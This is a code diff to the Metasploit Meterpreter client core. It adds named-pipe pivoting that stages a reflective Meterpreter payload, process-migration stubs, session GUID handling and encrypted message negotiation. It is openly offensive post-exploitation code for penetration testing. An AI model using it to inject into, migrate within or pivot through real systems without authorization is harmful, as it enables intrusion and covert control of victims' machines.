@@ -3,6 +3,7 @@
 require 'rex/post/meterpreter/packet'
 require 'rex/post/meterpreter/extension'
 require 'rex/post/meterpreter/client'
+require 'msf/core/payload/transport_config'
 
 # Used to generate a reflective DLL when migrating. This is yet another
 # argument for moving the meterpreter client into the Msf namespace.
@@ -16,6 +17,8 @@ require 'rex/payloads/meterpreter/uri_checksum'
 
 # certificate hash checking
 require 'rex/socket/x509_certificate'
+
+require 'openssl'
 
 module Rex
 module Post
@@ -64,6 +67,44 @@ class ClientCore < Extension
   # Core commands
   #
   ##
+
+  #
+  # create a named pipe pivot
+  #
+  def create_named_pipe_pivot(opts)
+    request = Packet.create_request('core_pivot_add')
+    request.add_tlv(TLV_TYPE_PIVOT_NAMED_PIPE_NAME, opts[:pipe_name])
+
+
+    c = Class.new(::Msf::Payload)
+    c.include(::Msf::Payload::Stager)
+    c.include(::Msf::Payload::TransportConfig)
+
+    # Include the appropriate reflective dll injection module for the target process architecture...
+    if opts[:arch] == ARCH_X86
+      c.include(::Msf::Payload::Windows::MeterpreterLoader)
+    elsif opts[:arch] == ARCH_X64
+      c.include(::Msf::Payload::Windows::MeterpreterLoader_x64)
+    end
+
+    stage_opts = {
+      force_write_handle: true,
+      datastore: {
+        'PIPEHOST' => opts[:pipe_host],
+        'PIPENAME' => opts[:pipe_name]
+      }
+    }
+
+    stager = c.new()
+
+    stage_opts[:transport_config] = [stager.transport_config_reverse_named_pipe(stage_opts)]
+    stage = stager.stage_payload(stage_opts)
+
+    request.add_tlv(TLV_TYPE_PIVOT_STAGE_DATA, stage)
+    request.add_tlv(TLV_TYPE_PIVOT_STAGE_DATA_SIZE, stage.length)
+
+    response = self.client.send_request(request)
+  end
 
   #
   # Get a list of loaded commands for the given extension.
@@ -125,6 +166,9 @@ class ClientCore < Extension
     result
   end
 
+  #
+  # Set associated transport timeouts for the currently active transport.
+  #
   def set_transport_timeouts(opts={})
     request = Packet.create_request('core_transport_set_timeouts')
 
@@ -207,7 +251,7 @@ class ClientCore < Extension
         image = f.read
       }
 
-      if !image.nil?
+      if image
         request.add_tlv(TLV_TYPE_DATA, image, false, client.capabilities[:zlib])
       else
         raise RuntimeError, "Failed to serialize library #{library_path}.", caller
@@ -298,6 +342,9 @@ class ClientCore < Extension
     return true
   end
 
+  #
+  # Set the UUID on the target session.
+  #
   def set_uuid(uuid)
     request = Packet.create_request('core_set_uuid')
     request.add_tlv(TLV_TYPE_UUID, uuid.to_raw)
@@ -307,10 +354,39 @@ class ClientCore < Extension
     true
   end
 
+  #
+  # Set the session GUID on the target session.
+  #
+  def set_session_guid(guid)
+    request = Packet.create_request('core_set_session_guid')
+    request.add_tlv(TLV_TYPE_SESSION_GUID, guid)
+
+    client.send_request(request)
+
+    true
+  end
+
+  #
+  # Get the session GUID from the target session.
+  #
+  def get_session_guid(timeout=nil)
+    request = Packet.create_request('core_get_session_guid')
+
+    args = [request]
+    args << timeout if timeout
+
+    response = client.send_request(*args)
+
+    response.get_tlv_value(TLV_TYPE_SESSION_GUID)
+  end
+
+  #
+  # Get the machine ID from the target session.
+  #
   def machine_id(timeout=nil)
     request = Packet.create_request('core_machine_id')
 
-    args = [ request ]
+    args = [request]
     args << timeout if timeout
 
     response = client.send_request(*args)
@@ -325,6 +401,9 @@ class ClientCore < Extension
     Rex::Text.md5(mid.to_s.downcase.strip)
   end
 
+  #
+  # Get the current native arch from the target session.
+  #
   def native_arch(timeout=nil)
     # Not all meterpreter implementations support this
     request = Packet.create_request('core_native_arch')
@@ -337,6 +416,9 @@ class ClientCore < Extension
     response.get_tlv_value(TLV_TYPE_STRING)
   end
 
+  #
+  # Remove a transport from the session based on the provided options.
+  #
   def transport_remove(opts={})
     request = transport_prepare_request('core_transport_remove', opts)
 
@@ -347,6 +429,9 @@ class ClientCore < Extension
     return true
   end
 
+  #
+  # Add a transport to the session based on the provided options.
+  #
   def transport_add(opts={})
     request = transport_prepare_request('core_transport_add', opts)
 
@@ -357,6 +442,9 @@ class ClientCore < Extension
     return true
   end
 
+  #
+  # Change the currently active transport on the session.
+  #
   def transport_change(opts={})
     request = transport_prepare_request('core_transport_change', opts)
 
@@ -367,6 +455,9 @@ class ClientCore < Extension
     return true
   end
 
+  #
+  # Sleep the current session for the given number of seconds.
+  #
   def transport_sleep(seconds)
     return false if seconds == 0
 
@@ -379,12 +470,18 @@ class ClientCore < Extension
     return true
   end
 
+  #
+  # Change the active transport to the next one in the transport list.
+  #
   def transport_next
     request = Packet.create_request('core_transport_next')
     client.send_request(request)
     return true
   end
 
+  #
+  # Change the active transport to the previous one in the transport list.
+  #
   def transport_prev
     request = Packet.create_request('core_transport_prev')
     client.send_request(request)
@@ -520,11 +617,11 @@ class ClientCore < Extension
       request.add_tlv(TLV_TYPE_MIGRATE_SOCKET_PATH, socket_path, false, client.capabilities[:zlib])
     end
 
-    request.add_tlv( TLV_TYPE_MIGRATE_PID, target_pid )
-    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD_LEN, migrate_payload.length )
-    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, migrate_payload, false, client.capabilities[:zlib])
-    request.add_tlv( TLV_TYPE_MIGRATE_STUB_LEN, migrate_stub.length )
-    request.add_tlv( TLV_TYPE_MIGRATE_STUB, migrate_stub, false, client.capabilities[:zlib])
+    request.add_tlv(TLV_TYPE_MIGRATE_PID, target_pid)
+    request.add_tlv(TLV_TYPE_MIGRATE_PAYLOAD_LEN, migrate_payload.length)
+    request.add_tlv(TLV_TYPE_MIGRATE_PAYLOAD, migrate_payload, false, client.capabilities[:zlib])
+    request.add_tlv(TLV_TYPE_MIGRATE_STUB_LEN, migrate_stub.length)
+    request.add_tlv(TLV_TYPE_MIGRATE_STUB, migrate_stub, false, client.capabilities[:zlib])
 
     if target_process['arch'] == ARCH_X64
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
@@ -542,13 +639,18 @@ class ClientCore < Extension
     # Send the migration request. Timeout can be specified by the caller, or set to a min
     # of 60 seconds.
     timeout = [(opts[:timeout] || 0), 60].max
-    client.send_request(request, timeout)
+    response = client.send_request(request, timeout)
+
+    # Post-migration the session doesn't have encryption any more.
+    # Set the TLV key to nil to make sure that the old key isn't used
+    # at all.
+    client.tlv_enc_key = nil
 
     if client.passive_service
       # Sleep for 5 seconds to allow the full handoff, this prevents
       # the original process from stealing our loadlib requests
       ::IO.select(nil, nil, nil, 5.0)
-    else
+    elsif client.pivot_session.nil?
       # Prevent new commands from being sent while we finish migrating
       client.comm_mutex.synchronize do
         # Disable the socket request monitor
@@ -558,27 +660,33 @@ class ClientCore < Extension
         # Now communicating with the new process
         ###
 
-        # If renegotiation takes longer than a minute, it's a pretty
-        # good bet that migration failed and the remote side is hung.
-        # Since we have the comm_mutex here, we *must* release it to
-        # keep from hanging the packet dispatcher thread, which results
-        # in blocking the entire process.
-        begin
-          Timeout.timeout(timeout) do
-            # Renegotiate SSL over this socket
-            client.swap_sock_ssl_to_plain()
-            client.swap_sock_plain_to_ssl()
+        # only renegotiate SSL if the session had support for it in the
+        # first place!
+        if client.supports_ssl?
+          # If renegotiation takes longer than a minute, it's a pretty
+          # good bet that migration failed and the remote side is hung.
+          # Since we have the comm_mutex here, we *must* release it to
+          # keep from hanging the packet dispatcher thread, which results
+          # in blocking the entire process.
+          begin
+            Timeout.timeout(timeout) do
+              # Renegotiate SSL over this socket
+              client.swap_sock_ssl_to_plain()
+              client.swap_sock_plain_to_ssl()
+            end
+          rescue TimeoutError
+            client.alive = false
+            return false
           end
-        rescue TimeoutError
-          client.alive = false
-          return false
         end
 
         # Restart the socket monitor
         client.monitor_socket
-
       end
     end
+
+    # Renegotiate TLV encryption on the migrated session
+    client.tlv_enc_key = negotiate_tlv_encryption
 
     # Load all the extensions that were loaded in the previous instance (using the correct platform/binary_suffix)
     client.ext.aliases.keys.each { |e|
@@ -621,12 +729,51 @@ class ClientCore < Extension
     end
   end
 
+  #
+  # Negotiates the use of encryption at the TLV level
+  #
+  def negotiate_tlv_encryption
+    sym_key = nil
+    rsa_key = OpenSSL::PKey::RSA.new(2048)
+    rsa_pub_key = rsa_key.public_key
+
+    request  = Packet.create_request('core_negotiate_tlv_encryption')
+    request.add_tlv(TLV_TYPE_RSA_PUB_KEY, rsa_pub_key.to_pem)
+
+    begin
+      response = client.send_request(request)
+      key_enc = response.get_tlv_value(TLV_TYPE_ENC_SYM_KEY)
+      key_type = response.get_tlv_value(TLV_TYPE_SYM_KEY_TYPE)
+
+      if key_enc
+        sym_key = rsa_key.private_decrypt(key_enc, OpenSSL::PKey::RSA::PKCS1_PADDING)
+      else
+        sym_key = response.get_tlv_value(TLV_TYPE_SYM_KEY)
+      end
+    rescue OpenSSL::PKey::RSAError, Rex::Post::Meterpreter::RequestError
+      # 1) OpenSSL error may be due to padding issues (or something else)
+      # 2) Request error probably means the request isn't supported, so fallback to plain
+    end
+
+    {
+      key:  sym_key,
+      type: key_type
+    }
+  end
+
 private
 
+  #
+  # Get a reference to the currently active transport.
+  #
   def get_current_transport
     transport_list[:transports][0]
   end
 
+  #
+  # Generate a migrate stub that is specific to the current transport type and the
+  # target process.
+  #
   def generate_migrate_stub(target_process)
     stub = nil
 
@@ -640,6 +787,8 @@ private
         case t[:url]
         when /^tcp/i
           c.include(::Msf::Payload::Windows::MigrateTcp)
+        when /^pipe/i
+          c.include(::Msf::Payload::Windows::MigrateNamedPipe)
         when /^http/i
           # Covers HTTP and HTTPS
           c.include(::Msf::Payload::Windows::MigrateHttp)
@@ -649,6 +798,8 @@ private
         case t[:url]
         when /^tcp/i
           c.include(::Msf::Payload::Windows::MigrateTcp_x64)
+        when /^pipe/i
+          c.include(::Msf::Payload::Windows::MigrateNamedPipe_x64)
         when /^http/i
           # Covers HTTP and HTTPS
           c.include(::Msf::Payload::Windows::MigrateHttp_x64)
@@ -663,6 +814,10 @@ private
     stub
   end
 
+  #
+  # Helper function to prepare a transport request that will be sent to the
+  # attached session.
+  #
   def transport_prepare_request(method, opts={})
     unless valid_transport?(opts[:transport]) && opts[:lport]
       return nil
@@ -730,7 +885,7 @@ private
 
       if opts[:proxy_host] && opts[:proxy_port]
         prefix = 'http://'
-        prefix = 'socks=' if opts[:proxy_type] == 'socks'
+        prefix = 'socks=' if opts[:proxy_type].to_s.downcase == 'socks'
         proxy = "#{prefix}#{opts[:proxy_host]}:#{opts[:proxy_port]}"
         request.add_tlv(TLV_TYPE_TRANS_PROXY_HOST, proxy)
 
@@ -751,6 +906,9 @@ private
   end
 
 
+  #
+  # Create a full migration payload specific to the target process.
+  #
   def generate_migrate_payload(target_process)
     case client.platform
     when 'windows'
@@ -764,6 +922,9 @@ private
     blob
   end
 
+  #
+  # Create a full Windows-specific migration payload specific to the target process.
+  #
   def generate_migrate_windows_payload(target_process)
     c = Class.new( ::Msf::Payload )
     c.include( ::Msf::Payload::Stager )
@@ -783,16 +944,25 @@ private
     migrate_stager.stage_meterpreter
   end
 
+  #
+  # Create a full Linux-specific migration payload specific to the target process.
+  #
   def generate_migrate_linux_payload
     MetasploitPayloads.read('meterpreter', 'msflinker_linux_x86.bin')
   end
 
+  #
+  # Determine the elf entry poitn for the given payload.
+  #
   def elf_ep(payload)
     elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
     ep = elf.elf_header.e_entry
     return ep
   end
 
+  #
+  # Get the tmp folder for the session.
+  #
   def tmp_folder
     tmp = client.sys.config.getenv('TMPDIR')
 
